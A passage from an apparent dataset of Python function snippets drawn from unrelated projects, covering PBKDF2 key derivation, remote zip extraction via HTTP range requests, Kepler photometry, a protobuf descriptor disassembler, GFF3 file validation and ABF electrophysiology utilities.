            "def _generate_key(pass_id, passphrases, salt, algorithm):\n        '''Generate and return PBKDF2 key'''\n\n        if pass_id not in passphrases:\n            raise Exception('Passphrase not defined for id: %d' % pass_id)\n\n        passphrase = passphrases[pass_id]\n\n        if len(passphrase) < 32:\n            raise Exception('Passphrase less than 32 characters long')\n\n        digestmod = EncryptedPickle._get_hashlib(algorithm['pbkdf2_algorithm'])\n\n        encoder = PBKDF2(passphrase, salt,\n                         iterations=algorithm['pbkdf2_iterations'],\n                         digestmodule=digestmod)\n\n        return encoder.read(algorithm['key_size'])"
        ],
        [
            "def _update_dict(data, default_data, replace_data=False):\n        '''Update algorithm definition type dictionaries'''\n\n        if not data:\n            data = default_data.copy()\n            return data\n\n        if not isinstance(data, dict):\n            raise TypeError('Value not dict type')\n        if len(data) > 255:\n            raise ValueError('More than 255 values defined')\n        for i in data.keys():\n            if not isinstance(i, int):\n                raise TypeError('Index not int type')\n            if i < 0 or i > 255:\n                raise ValueError('Index value out of range')\n\n        if not replace_data:\n            data.update(default_data)\n\n        return data"
        ],
        [
            "def getTableOfContents(self):\n        \"\"\"\n        This function populates the internal tableOfContents list with the contents\n        of the zip file TOC. If the server does not support ranged requests, this will raise\n        and exception. It will also throw an exception if the TOC cannot be found.\n        \"\"\"\n\n        self.directory_size = self.getDirectorySize()\n        if self.directory_size > 65536:\n            self.directory_size += 2\n            self.requestContentDirectory()\n\n\n        # and find the offset from start of file where it can be found\n        directory_start = unpack(\"i\", self.raw_bytes[self.directory_end + 16: self.directory_end + 20])[0]\n\n        # find the data in the raw_bytes\n        self.raw_bytes = self.raw_bytes\n        current_start = directory_start - self.start\n        filestart = 0\n        compressedsize = 0\n        tableOfContents = []\n\n        try:\n            while True:\n                # get file name size (n), extra len (m) and comm len (k)\n                zip_n = unpack(\"H\", self.raw_bytes[current_start + 28: current_start + 28 + 2])[0]\n                zip_m = unpack(\"H\", self.raw_bytes[current_start + 30: current_start + 30 + 2])[0]\n                zip_k = unpack(\"H\", self.raw_bytes[current_start + 32: current_start + 32 + 2])[0]\n\n                filename = self.raw_bytes[current_start + 46: current_start + 46 + zip_n]\n\n                # check if this is the index file\n                filestart = unpack(\"I\", self.raw_bytes[current_start + 42: current_start + 42 + 4])[0]\n                compressedsize = unpack(\"I\", self.raw_bytes[current_start + 20: current_start + 20 + 4])[0]\n                uncompressedsize = unpack(\"I\", self.raw_bytes[current_start + 24: current_start + 24 + 4])[0]\n                tableItem = {\n                    'filename': filename,\n                    'compressedsize': compressedsize,\n                    'uncompressedsize': uncompressedsize,\n                    'filestart': filestart\n                }\n                tableOfContents.append(tableItem)\n\n                # not this file, move along\n                current_start = current_start + 46 + zip_n + zip_m + zip_k\n        except:\n            pass\n\n        self.tableOfContents = tableOfContents\n        return tableOfContents"
        ],
        [
            "def extractFile(self, filename):\n        \"\"\"\n        This function will extract a single file from the remote zip without downloading\n        the entire zip file. The filename argument should match whatever is in the 'filename'\n        key of the tableOfContents.\n        \"\"\"\n        files = [x for x in self.tableOfContents if x['filename'] == filename]\n        if len(files) == 0:\n            raise FileNotFoundException()\n\n        fileRecord = files[0]\n\n        # got here? need to fetch the file size\n        metaheadroom = 1024  # should be enough\n        request = urllib2.Request(self.zipURI)\n        start = fileRecord['filestart']\n        end = fileRecord['filestart'] + fileRecord['compressedsize'] + metaheadroom\n        request.headers['Range'] = \"bytes=%s-%s\" % (start, end)\n        handle = urllib2.urlopen(request)\n\n        # make sure the response is ranged\n        return_range = handle.headers.get('Content-Range')\n        if return_range != \"bytes %d-%d/%s\" % (start, end, self.filesize):\n            raise Exception(\"Ranged requests are not supported for this URI\")\n\n        filedata = handle.read()\n\n        # find start of raw file data\n        zip_n = unpack(\"H\", filedata[26:28])[0]\n        zip_m = unpack(\"H\", filedata[28:30])[0]\n\n        # check compressed size\n        has_data_descriptor = bool(unpack(\"H\", filedata[6:8])[0] & 8)\n        comp_size = unpack(\"I\", filedata[18:22])[0]\n        if comp_size == 0 and has_data_descriptor:\n            # assume compressed size in the Central Directory is correct\n            comp_size = fileRecord['compressedsize']\n        elif comp_size != fileRecord['compressedsize']:\n            raise Exception(\"Something went wrong. Directory and file header disagree of compressed file size\")\n\n        raw_zip_data = filedata[30 + zip_n + zip_m: 30 + zip_n + zip_m + comp_size]\n        uncompressed_data = \"\"\n        \n        # can't decompress if stored without compression\n        compression_method = unpack(\"H\", filedata[8:10])[0]\n        if compression_method == 0:\n          return raw_zip_data\n\n        dec = zlib.decompressobj(-zlib.MAX_WBITS)\n        for chunk in raw_zip_data:\n            rv = dec.decompress(chunk)\n            if rv:\n                uncompressed_data = uncompressed_data + rv\n\n        return uncompressed_data"
        ],
        [
            "def do_photometry(self):\n        \"\"\"\n        Does photometry and estimates uncertainties by calculating the scatter around a linear fit to the data\n        in each orientation. This function is called by other functions and generally the user will not need\n        to interact with it directly.\n        \"\"\"\n        \n        std_f = np.zeros(4)\n        data_save = np.zeros_like(self.postcard)\n        self.obs_flux = np.zeros_like(self.reference_flux)\n\n\n        for i in range(4):\n            g = np.where(self.qs == i)[0]\n            wh = np.where(self.times[g] > 54947)\n\n            data_save[g] = np.roll(self.postcard[g], int(self.roll_best[i,0]), axis=1)\n            data_save[g] = np.roll(data_save[g], int(self.roll_best[i,1]), axis=2)\n\n            self.target_flux_pixels = data_save[:,self.targets == 1]\n            self.target_flux = np.sum(self.target_flux_pixels, axis=1)\n            \n            self.obs_flux[g] = self.target_flux[g] / self.reference_flux[g]\n            self.obs_flux[g] /= np.median(self.obs_flux[g[wh]])\n            \n            fitline = np.polyfit(self.times[g][wh], self.obs_flux[g][wh], 1)\n            std_f[i] = np.max([np.std(self.obs_flux[g][wh]/(fitline[0]*self.times[g][wh]+fitline[1])), 0.001])\n        \n        self.flux_uncert = std_f"
        ],
        [
            "def generate_panel(self, img):\n        \"\"\"\n        Creates the figure shown in ``adjust_aperture`` for visualization purposes. Called by other functions\n        and generally not called by the user directly.\n\n        Args: \n            img: The data frame to be passed through to be plotted. A cutout of the ``integrated_postcard``\n        \n        \"\"\"\n        plt.figure(figsize=(14,6))\n        ax = plt.gca()\n        fig = plt.gcf()\n        plt.subplot(122)\n        \n        \n        data_save = np.zeros_like(self.postcard)\n        self.roll_best = np.zeros((4,2))\n        \n        for i in range(4):\n            g = np.where(self.qs == i)[0]\n            wh = np.where(self.times[g] > 54947)\n\n            self.roll_best[i] = self.do_rolltest(g, wh)\n            \n        self.do_photometry()\n        for i in range(4):\n            g = np.where(self.qs == i)[0]\n            plt.errorbar(self.times[g], self.obs_flux[g], yerr=self.flux_uncert[i], fmt=fmt[i])\n            \n        plt.xlabel('Time', fontsize=20)\n        plt.ylabel('Relative Flux', fontsize=20)\n \n        \n        plt.subplot(121)\n        implot = plt.imshow(img, interpolation='nearest', cmap='gray', vmin=98000*52, vmax=104000*52)\n        cid = fig.canvas.mpl_connect('button_press_event', self.onclick)\n        \n        plt.show(block=True)"
        ],
        [
            "def calc_centroids(self):\n        \"\"\"\n        Identify the centroid positions for the target star at all epochs. Useful for verifying that there is\n        no correlation between flux and position, as might be expected for high proper motion stars.\n        \"\"\"\n        self.cm = np.zeros((len(self.postcard), 2))\n        for i in range(len(self.postcard)):\n            target = self.postcard[i]\n            target[self.targets != 1] = 0.0\n            self.cm[i] = center_of_mass(target)"
        ],
        [
            "def define_spotsignal(self):\n        \"\"\"\n        Identify the \"expected\" flux value at the time of each observation based on the \n        Kepler long-cadence data, to ensure variations observed are not the effects of a single\n        large starspot. Only works if the target star was targeted for long or short cadence\n        observations during the primary mission.\n        \"\"\"\n        client = kplr.API()\n        star = client.star(self.kic)\n\n        lcs = star.get_light_curves(short_cadence=False)\n        time, flux, ferr, qual = [], [], [], []\n        for lc in lcs:\n            with lc.open() as f:\n                hdu_data = f[1].data\n                time.append(hdu_data[\"time\"])\n                flux.append(hdu_data[\"pdcsap_flux\"])\n                ferr.append(hdu_data[\"pdcsap_flux_err\"])\n                qual.append(hdu_data[\"sap_quality\"])\n            tout = np.array([])\n            fout = np.array([])\n            eout = np.array([])\n            for i in range(len(flux)):\n                t = time[i][qual[i] == 0]\n                f = flux[i][qual[i] == 0]\n                e = ferr[i][qual[i] == 0]\n\n                t = t[np.isfinite(f)]\n                e = e[np.isfinite(f)]\n                f = f[np.isfinite(f)]\n\n                e /= np.median(f)\n                f /= np.median(f)\n                tout = np.append(tout, t[50:]+54833)\n                fout = np.append(fout, f[50:])\n                eout = np.append(eout, e[50:])\n\n            self.spot_signal = np.zeros(52)\n\n            for i in range(len(self.times)):\n                if self.times[i] < 55000:\n                    self.spot_signal[i] = 1.0\n                else:\n                    self.spot_signal[i] = fout[np.abs(self.times[i] - tout) == np.min(np.abs(self.times[i] - tout))]"
        ],
        [
            "def model_uncert(self):\n        \"\"\"\n        Estimate the photometric uncertainties on each data point following Equation A.2 of The Paper.\n        Based on the kepcal package of Dan Foreman-Mackey.\n        \"\"\"\n        Y = self.photometry_array.T\n        Y /= np.median(Y, axis=1)[:, None]\n        C = np.median(Y, axis=0)\n        \n        nstars, nobs = np.shape(Y)\n        \n        Z = np.empty((nstars, 4))\n        \n        qs = self.qs.astype(int)\n        \n        for s in range(4):\n            Z[:, s] = np.median((Y / C)[:, qs == s], axis=1)\n\n        resid2 = (Y - Z[:, qs] * C)**2\n        z = Z[:, qs]\n        trend = z * C[None, :]\n        \n        lnS = np.log(np.nanmedian(resid2, axis=0))\n        jitter = np.log(0.1*np.nanmedian(np.abs(np.diff(Y, axis=1))))\n\n        cal_ferr = np.sqrt(np.exp(2*(jitter/trend))+z**2*np.exp(lnS)[None, :])\n        \n        self.modeled_uncert = cal_ferr\n        self.target_uncert = cal_ferr[0]"
        ],
        [
            "def _dump_field(self, fd):\n        \"\"\"Dump single field.\n        \"\"\"\n        v = {}\n        v['label'] = Pbd.LABELS[fd.label]\n        v['type'] = fd.type_name if len(fd.type_name) > 0 else Pbd.TYPES[fd.type]\n        v['name'] = fd.name\n        v['number'] = fd.number\n        v['default'] = '[default = {}]'.format(fd.default_value) if len(fd.default_value) > 0 else ''\n        \n        f = '{label} {type} {name} = {number} {default};'.format(**v)\n        f = ' '.join(f.split())\n        self._print(f)\n        \n        if len(fd.type_name) > 0:\n            self.uses.append(fd.type_name)"
        ],
        [
            "def disassemble(self):\n        \"\"\"Disassemble serialized protocol buffers file.\n        \"\"\"\n        ser_pb = open(self.input_file, 'rb').read()  # Read serialized pb file\n        \n        fd = FileDescriptorProto()\n        fd.ParseFromString(ser_pb)\n        self.name = fd.name\n        \n        self._print('// Reversed by pbd (https://github.com/rsc-dev/pbd)')\n        self._print('syntax = \"proto2\";')\n        self._print('')\n        \n        if len(fd.package) > 0:\n            self._print('package {};'.format(fd.package))\n            self.package = fd.package\n        else:\n            self._print('// Package not defined')\n        \n        self._walk(fd)"
        ],
        [
            "def find_imports(self, pbds):\n        \"\"\"Find all missing imports in list of Pbd instances.\n        \"\"\"\n        # List of types used, but not defined\n        imports = list(set(self.uses).difference(set(self.defines)))\n        \n        # Clumpsy, but enought for now \n        for imp in imports:\n            for p in pbds:\n                if imp in p.defines:\n                    self.imports.append(p.name)\n                    break\n        \n        self.imports = list(set(self.imports))\n        \n        for import_file in self.imports:\n            self.lines.insert(2, 'import \"{}\";'.format(import_file))"
        ],
        [
            "def fasta_dict_to_file(fasta_dict, fasta_file, line_char_limit=None):\n    \"\"\"Write fasta_dict to fasta_file\n\n    :param fasta_dict: returned by fasta_file_to_dict\n    :param fasta_file: output file can be a string path or a file object\n    :param line_char_limit: None = no limit (default)\n    :return: None\n    \"\"\"\n    fasta_fp = fasta_file\n    if isinstance(fasta_file, str):\n        fasta_fp = open(fasta_file, 'wb')\n\n    for key in fasta_dict:\n        seq = fasta_dict[key]['seq']\n        if line_char_limit:\n            seq = '\\n'.join([seq[i:i+line_char_limit] for i in range(0, len(seq), line_char_limit)])\n        fasta_fp.write(u'{0:s}\\n{1:s}\\n'.format(fasta_dict[key]['header'], seq))"
        ],
        [
            "def add_line_error(self, line_data, error_info, log_level=logging.ERROR):\n        \"\"\"Helper function to record and log an error message\n\n        :param line_data: dict\n        :param error_info: dict\n        :param logger:\n        :param log_level: int\n        :return:\n        \"\"\"\n        if not error_info: return\n        try:\n            line_data['line_errors'].append(error_info)\n        except KeyError:\n            line_data['line_errors'] = [error_info]\n        except TypeError: # no line_data\n            pass\n        try:\n            self.logger.log(log_level, Gff3.error_format.format(current_line_num=line_data['line_index'] + 1, error_type=error_info['error_type'], message=error_info['message'], line=line_data['line_raw'].rstrip()))\n        except AttributeError: # no logger\n            pass"
        ],
        [
            "def check_parent_boundary(self):\n        \"\"\"\n        checks whether child features are within the coordinate boundaries of parent features\n\n        :return:\n        \"\"\"\n        for line in self.lines:\n            for parent_feature in line['parents']:\n                ok = False\n                for parent_line in parent_feature:\n                    if parent_line['start'] <= line['start'] and line['end'] <= parent_line['end']:\n                        ok = True\n                        break\n                if not ok:\n                    self.add_line_error(line, {'message': 'This feature is not contained within the feature boundaries of parent: {0:s}: {1:s}'.format(\n                        parent_feature[0]['attributes']['ID'],\n                        ','.join(['({0:s}, {1:d}, {2:d})'.format(line['seqid'], line['start'], line['end']) for line in parent_feature])\n                    ), 'error_type': 'BOUNDS', 'location': 'parent_boundary'})"
        ],
        [
            "def check_phase(self):\n        \"\"\"\n        1. get a list of CDS with the same parent\n        2. sort according to strand\n        3. calculate and validate phase\n        \"\"\"\n        plus_minus = set(['+', '-'])\n        for k, g in groupby(sorted([line for line in self.lines if  line['line_type'] == 'feature' and line['type'] == 'CDS' and 'Parent' in line['attributes']], key=lambda x: x['attributes']['Parent']), key=lambda x: x['attributes']['Parent']):\n            cds_list = list(g)\n            strand_set = list(set([line['strand'] for line in cds_list]))\n            if len(strand_set) != 1:\n                for line in cds_list:\n                    self.add_line_error(line, {'message': 'Inconsistent CDS strand with parent: {0:s}'.format(k), 'error_type': 'STRAND'})\n                continue\n            if len(cds_list) == 1:\n                if cds_list[0]['phase'] != 0:\n                    self.add_line_error(cds_list[0], {'message': 'Wrong phase {0:d}, should be {1:d}'.format(cds_list[0]['phase'], 0), 'error_type': 'PHASE'})\n                continue\n            strand = strand_set[0]\n            if strand not in plus_minus:\n                # don't process unknown strands\n                continue\n            if strand == '-':\n                # sort end descending\n                sorted_cds_list = sorted(cds_list, key=lambda x: x['end'], reverse=True)\n            else:\n                sorted_cds_list = sorted(cds_list, key=lambda x: x['start'])\n            phase = 0\n            for line in sorted_cds_list:\n                if line['phase'] != phase:\n                    self.add_line_error(line, {'message': 'Wrong phase {0:d}, should be {1:d}'.format(line['phase'], phase), 'error_type': 'PHASE'})\n                phase = (3 - ((line['end'] - line['start'] + 1 - phase) % 3)) % 3"
        ],
        [
            "def adopt(self, old_parent, new_parent):\n        \"\"\"\n        Transfer children from old_parent to new_parent\n\n        :param old_parent: feature_id(str) or line_index(int) or line_data(dict) or feature\n        :param new_parent: feature_id(str) or line_index(int) or line_data(dict)\n        :return: List of children transferred\n        \"\"\"\n        try: # assume line_data(dict)\n            old_id = old_parent['attributes']['ID']\n        except TypeError:\n            try: # assume line_index(int)\n                old_id = self.lines[old_parent]['attributes']['ID']\n            except TypeError: # assume feature_id(str)\n                old_id = old_parent\n        old_feature = self.features[old_id]\n        old_indexes = [ld['line_index'] for ld in old_feature]\n        try: # assume line_data(dict)\n            new_id = new_parent['attributes']['ID']\n        except TypeError:\n            try: # assume line_index(int)\n                new_id = self.lines[new_parent]['attributes']['ID']\n            except TypeError: # assume feature_id(str)\n                new_id = new_parent\n        new_feature = self.features[new_id]\n        new_indexes = [ld['line_index'] for ld in new_feature]\n        # build a list of children to be moved\n        # add the child to the new parent's children list if its not already there\n        # update the child's parent list and parent attribute\n        # finally remove the old parent's children list\n        children = old_feature[0]['children']\n        new_parent_children_set = set([ld['line_index'] for ld in new_feature[0]['children']])\n        for child in children:\n            if child['line_index'] not in new_parent_children_set:\n                new_parent_children_set.add(child['line_index'])\n                for new_ld in new_feature:\n                    new_ld['children'].append(child)\n                child['parents'].append(new_feature)\n                child['attributes']['Parent'].append(new_id)\n            # remove multiple, list.remove() only removes 1\n            child['parents'] = [f for f in child['parents'] if f[0]['attributes']['ID'] != old_id]\n            child['attributes']['Parent'] = [d for d in child['attributes']['Parent'] if d != old_id]\n        for old_ld in old_feature:\n            old_ld['children'] = []\n        return children"
        ],
        [
            "def remove(self, line_data, root_type=None):\n        \"\"\"\n        Marks line_data and all of its associated feature's 'line_status' as 'removed', does not actually remove the line_data from the data structure.\n        The write function checks the 'line_status' when writing the gff file.\n        Find the root parent of line_data of type root_type, remove all of its descendants.\n        If the root parent has a parent with no children after the remove, remove the root parent's parent recursively.\n\n        :param line_data:\n        :param root_type:\n        :return:\n        \"\"\"\n        roots = [ld for ld in self.ancestors(line_data) if (root_type and ld['line_type'] == root_type) or (not root_type and not ld['parents'])] or [line_data]\n        for root in roots:\n            root['line_status'] = 'removed'\n            root_descendants = self.descendants(root)\n            for root_descendant in root_descendants:\n                root_descendant['line_status'] = 'removed'\n            root_ancestors = self.ancestors(root) # BFS, so we will process closer ancestors first\n            for root_ancestor in root_ancestors:\n                if len([ld for ld in root_ancestor['children'] if ld['line_status'] != 'removed']) == 0: # if all children of a root_ancestor is removed\n                    # remove this root_ancestor\n                    root_ancestor['line_status'] = 'removed'"
        ],
        [
            "def abfIDfromFname(fname):\n    \"\"\"given a filename, return the ABFs ID string.\"\"\"\n    fname=os.path.abspath(fname)\n    basename=os.path.basename(fname)\n    return os.path.splitext(basename)[0]"
        ],
        [
            "def abfProtocol(fname):\n    \"\"\"Determine the protocol used to record an ABF file\"\"\"\n    f=open(fname,'rb')\n    raw=f.read(30*1000) #it should be in the first 30k of the file\n    f.close()\n    raw=raw.decode(\"utf-8\",\"ignore\")\n    raw=raw.split(\"Clampex\")[1].split(\".pro\")[0]\n    protocol = os.path.basename(raw) # the whole protocol filename\n    protocolID = protocol.split(\" \")[0] # just the first number\n    return protocolID"
        ],
        [
            "def headerHTML(header,fname):\n        \"\"\"given the bytestring ABF header, make and launch HTML.\"\"\"\n        html=\"<html><body><code>\"\n        html+=\"<h2>%s</h2>\"%(fname)\n        html+=pprint.pformat(header, indent=1)\n        html=html.replace(\"\\n\",'<br>').replace(\" \",\"&nbsp;\")\n        html=html.replace(r\"\\x00\",\"\")\n        html+=\"</code></body></html>\"\n        print(\"saving header file:\",fname)\n        f=open(fname,'w')\n        f.write(html)\n        f.close()\n        webbrowser.open(fname)"
        ],
        [
            "def setsweeps(self):\n        \"\"\"iterate over every sweep\"\"\"\n        for sweep in range(self.sweeps):\n            self.setsweep(sweep)\n            yield self.sweep"
        ],
        [
            "def comments_load(self):\n        \"\"\"read the header and populate self with information about comments\"\"\"\n        self.comment_times,self.comment_sweeps,self.comment_tags=[],[],[]\n        self.comments=0 # will be >0 if comments exist\n        self.comment_text=\"\"\n\n        try:\n            # this used to work\n            self.comment_tags = list(self.ABFblock.segments[0].eventarrays[0].annotations['comments'])\n            self.comment_times = list(self.ABFblock.segments[0].eventarrays[0].times/self.trace.itemsize)\n            self.comment_sweeps = list(self.comment_times)\n        except:\n            # now this notation seems to work\n            for events in self.ABFblock.segments[0].events: # this should only happen once actually\n                self.comment_tags = events.annotations['comments'].tolist()\n                self.comment_times = np.array(events.times.magnitude/self.trace.itemsize)\n                self.comment_sweeps = self.comment_times/self.sweepInterval\n\n        for i,c in enumerate(self.comment_tags):\n            self.comment_tags[i]=c.decode(\"utf-8\")"
        ],
        [
            "def get_protocol_sequence(self,sweep):\n        \"\"\"\n        given a sweep, return the protocol as condensed sequence.\n        This is better for comparing similarities and determining steps.\n        There should be no duplicate numbers.\n        \"\"\"\n        self.setsweep(sweep)\n        return list(self.protoSeqX),list(self.protoSeqY)"
        ],
        [
            "def average(self,t1=0,t2=None,setsweep=False):\n        \"\"\"return the average of part of the current sweep.\"\"\"\n        if setsweep:\n            self.setsweep(setsweep)\n        if t2 is None or t2>self.sweepLength:\n            t2=self.sweepLength\n            self.log.debug(\"resetting t2 to [%f]\",t2)\n        t1=max(t1,0)\n        if t1>t2:\n            self.log.error(\"t1 cannot be larger than t2\")\n            return False\n        I1,I2=int(t1*self.pointsPerSec),int(t2*self.pointsPerSec)\n        if I1==I2:\n            return np.nan\n        return np.average(self.sweepY[I1:I2])"
        ],
        [
            "def averageSweep(self,sweepFirst=0,sweepLast=None):\n        \"\"\"\n        Return a sweep which is the average of multiple sweeps.\n        For now, standard deviation is lost.\n        \"\"\"\n        if sweepLast is None:\n            sweepLast=self.sweeps-1\n        nSweeps=sweepLast-sweepFirst+1\n        runningSum=np.zeros(len(self.sweepY))\n        self.log.debug(\"averaging sweep %d to %d\",sweepFirst,sweepLast)\n        for sweep in np.arange(nSweeps)+sweepFirst:\n            self.setsweep(sweep)\n            runningSum+=self.sweepY.flatten()\n        average=runningSum/nSweeps\n        #TODO: standard deviation?\n        return average"
        ],
        [
            "def kernel_gaussian(self, sizeMS, sigmaMS=None, forwardOnly=False):\n        \"\"\"create kernel based on this ABF info.\"\"\"\n        sigmaMS=sizeMS/10 if sigmaMS is None else sigmaMS\n        size,sigma=sizeMS*self.pointsPerMs,sigmaMS*self.pointsPerMs\n        self.kernel=swhlab.common.kernel_gaussian(size,sigma,forwardOnly)\n        return self.kernel"
        ],
        [
            "def sweepYfiltered(self):\n        \"\"\"\n        Get the filtered sweepY of the current sweep.\n        Only works if self.kernel has been generated.\n        \"\"\"\n        assert self.kernel is not None\n        return swhlab.common.convolve(self.sweepY,self.kernel)"
        ],
        [
            "def dictFlat(l):\n    \"\"\"Given a list of list of dicts, return just the dicts.\"\"\"\n    if type(l) is dict:\n        return [l]\n    if \"numpy\" in str(type(l)):\n        return l\n    dicts=[]\n    for item in l:\n        if type(item)==dict:\n            dicts.append(item)\n        elif type(item)==list:\n            for item2 in item:\n                dicts.append(item2)\n    return dicts"
        ],
        [
            "def matrixValues(matrix,key):\n    \"\"\"given a key, return a list of values from the matrix with that key.\"\"\"\n    assert key in matrix.dtype.names\n    col=matrix.dtype.names.index(key)\n    values=np.empty(len(matrix))*np.nan\n    for i in range(len(matrix)):\n        values[i]=matrix[i][col]\n    return values"
        ],
        [
            "def matrixToDicts(data):\n    \"\"\"given a recarray, return it as a list of dicts.\"\"\"\n\n    # 1D array\n    if \"float\" in str(type(data[0])):\n        d={}\n        for x in range(len(data)):\n            d[data.dtype.names[x]]=data[x]\n        return d\n\n    # 2D array\n    l=[]\n    for y in range(len(data)):\n        d={}\n        for x in range(len(data[y])):\n            d[data.dtype.names[x]]=data[y][x]\n        l.append(d)\n    return l"
        ],
        [
            "def html_temp_launch(html):\n    \"\"\"given text, make it a temporary HTML file and launch it.\"\"\"\n    fname = tempfile.gettempdir()+\"/swhlab/temp.html\"\n    with open(fname,'w') as f:\n        f.write(html)\n    webbrowser.open(fname)"
        ],
        [
            "def checkOut(thing,html=True):\n    \"\"\"show everything we can about an object's projects and methods.\"\"\"\n    msg=\"\"\n    for name in sorted(dir(thing)):\n        if not \"__\" in name:\n            msg+=\"<b>%s</b>\\n\"%name\n            try:\n                msg+=\" ^-VALUE: %s\\n\"%getattr(thing,name)()\n            except:\n                pass\n    if html:\n        html='<html><body><code>'+msg+'</code></body></html>'\n        html=html.replace(\" \",\"&nbsp;\").replace(\"\\n\",\"<br>\")\n        fname = tempfile.gettempdir()+\"/swhlab/checkout.html\"\n        with open(fname,'w') as f:\n            f.write(html)\n        webbrowser.open(fname)\n    print(msg.replace('<b>','').replace('</b>',''))"
        ],
        [
            "def matrixToHTML(data,names=None,units=None,bookName=None,sheetName=None,xCol=None):\n    \"\"\"Put 2d numpy data into a temporary HTML file.\"\"\"\n    if not names:\n        names=[\"\"]*len(data[0])\n        if data.dtype.names:\n            names=list(data.dtype.names)\n    if not units:\n        units=[\"\"]*len(data[0])\n        for i in range(len(units)):\n            if names[i] in UNITS.keys():\n                units[i]=UNITS[names[i]]\n    if 'recarray' in str(type(data)): #make it a regular array\n        data=data.view(float).reshape(data.shape + (-1,))\n    if xCol and xCol in names:\n        xCol=names.index(xCol)\n        names.insert(0,names[xCol])\n        units.insert(0,units[xCol])\n        data=np.insert(data,0,data[:,xCol],1)\n\n    htmlFname = tempfile.gettempdir()+\"/swhlab/WKS-%s.%s.html\"%(bookName,sheetName)\n    html=\"\"\"<body>\n    <style>\n    body {\n          background-color: #ababab;\n          padding:20px;\n          }\n    table {\n           font-size:12px;\n           border-spacing: 0;\n           border-collapse: collapse;\n           //border:2px solid #000000;\n           }\n    .name {background-color:#fafac8;text-align:center;}\n    .units {background-color:#fafac8;text-align:center;}\n    .data0 {background-color:#FFFFFF;font-family: monospace;text-align:center;}\n    .data1 {background-color:#FAFAFA;font-family: monospace;text-align:center;}\n    .labelRow {background-color:#e0dfe4; text-align:right;border:1px solid #000000;}\n    .labelCol {background-color:#e0dfe4; text-align:center;border:1px solid #000000;}\n    td {\n        border:1px solid #c0c0c0; padding:5px;\n        //font-family: Verdana, Geneva, sans-serif;\n        font-family: Arial, Helvetica, sans-serif\n        }\n    </style>\n    <html>\"\"\"\n    html+=\"<h1>FauxRigin</h1>\"\n    if bookName or sheetName:\n        html+='<code><b>%s / %s</b></code><br><br>'%(bookName,sheetName)\n    html+=\"<table>\"\n    #cols=list(range(len(names)))\n    colNames=['']\n    for i in range(len(units)):\n        label=\"%s (%d)\"%(chr(i+ord('A')),i)\n        colNames.append(label)\n    html+=htmlListToTR(colNames,'labelCol','labelCol')\n    html+=htmlListToTR(['Long Name']+list(names),'name',td1Class='labelRow')\n    html+=htmlListToTR(['Units']+list(units),'units',td1Class='labelRow')\n    cutOff=False\n    for y in range(len(data)):\n        html+=htmlListToTR([y+1]+list(data[y]),trClass='data%d'%(y%2),td1Class='labelRow')\n        if y>=200:\n            cutOff=True\n            break\n    html+=\"</table>\"\n    html=html.replace(\">nan<\",\">--<\")\n    html=html.replace(\">None<\",\"><\")\n    if cutOff:\n        html+=\"<h3>... showing only %d of %d rows ...</h3>\"%(y,len(data))\n    html+=\"</body></html>\"\n    with open(htmlFname,'w') as f:\n        f.write(html)\n    webbrowser.open(htmlFname)\n    return"
        ],
        [
            "def XMLtoPython(xmlStr=r\"C:\\Apps\\pythonModules\\GSTemp.xml\"):\n    \"\"\"\n    given a string or a path to an XML file, return an XML object.\n    \"\"\"\n    #TODO: this absolute file path crazy stuff needs to stop!\n    if os.path.exists(xmlStr):\n        with open(xmlStr) as f:\n            xmlStr=f.read()\n    print(xmlStr)\n    print(\"DONE\")\n    return"
        ],
        [
            "def algo_exp(x, m, t, b):\n    \"\"\"mono-exponential curve.\"\"\"\n    return m*np.exp(-t*x)+b"
        ],
        [
            "def where_cross(data,threshold):\n    \"\"\"return a list of Is where the data first crosses above threshold.\"\"\"\n    Is=np.where(data>threshold)[0]\n    Is=np.concatenate(([0],Is))\n    Ds=Is[:-1]-Is[1:]+1\n    return Is[np.where(Ds)[0]+1]"
        ],
        [
            "def originFormat(thing):\n    \"\"\"Try to format anything as a 2D matrix with column names.\"\"\"\n    if type(thing) is list and type(thing[0]) is dict:\n        return originFormat_listOfDicts(thing)\n    if type(thing) is list and type(thing[0]) is list:\n        return originFormat_listOfDicts(dictFlat(thing))\n    else:\n        print(\" !! I don't know how to format this object!\")\n        print(thing)"
        ],
        [
            "def pickle_save(thing,fname):\n    \"\"\"save something to a pickle file\"\"\"\n    pickle.dump(thing, open(fname,\"wb\"),pickle.HIGHEST_PROTOCOL)\n    return thing"
        ],
        [
            "def msgDict(d,matching=None,sep1=\"=\",sep2=\"\\n\",sort=True,cantEndWith=None):\n    \"\"\"convert a dictionary to a pretty formatted string.\"\"\"\n    msg=\"\"\n    if \"record\" in str(type(d)):\n        keys=d.dtype.names\n    else:\n        keys=d.keys()\n    if sort:\n        keys=sorted(keys)\n    for key in keys:\n        if key[0]==\"_\":\n            continue\n        if matching:\n            if not key in matching:\n                continue\n        if cantEndWith and key[-len(cantEndWith)]==cantEndWith:\n            continue\n        if 'float' in str(type(d[key])):\n            s=\"%.02f\"%d[key]\n        else:\n            s=str(d[key])\n        if \"object\" in s:\n            s='<object>'\n        msg+=key+sep1+s+sep2\n    return msg.strip()"
        ],
        [
            "def determineProtocol(fname):\n    \"\"\"determine the comment cooked in the protocol.\"\"\"\n    f=open(fname,'rb')\n    raw=f.read(5000) #it should be in the first 5k of the file\n    f.close()\n    protoComment=\"unknown\"\n    if b\"SWHLab4[\" in raw:\n        protoComment=raw.split(b\"SWHLab4[\")[1].split(b\"]\",1)[0]\n    elif b\"SWH[\" in raw:\n        protoComment=raw.split(b\"SWH[\")[1].split(b\"]\",1)[0]\n    else:\n        protoComment=\"?\"\n    if not type(protoComment) is str:\n        protoComment=protoComment.decode(\"utf-8\")\n    return protoComment"
        ],
        [
            "def scanABFfolder(abfFolder):\n    \"\"\"\n    scan an ABF directory and subdirectory. Try to do this just once.\n    Returns ABF files, SWHLab files, and groups.\n    \"\"\"\n    assert os.path.isdir(abfFolder)\n    filesABF=forwardSlash(sorted(glob.glob(abfFolder+\"/*.*\")))\n    filesSWH=[]\n    if os.path.exists(abfFolder+\"/swhlab4/\"):\n        filesSWH=forwardSlash(sorted(glob.glob(abfFolder+\"/swhlab4/*.*\")))\n    groups=getABFgroups(filesABF)\n    return filesABF,filesSWH,groups"
        ],
        [
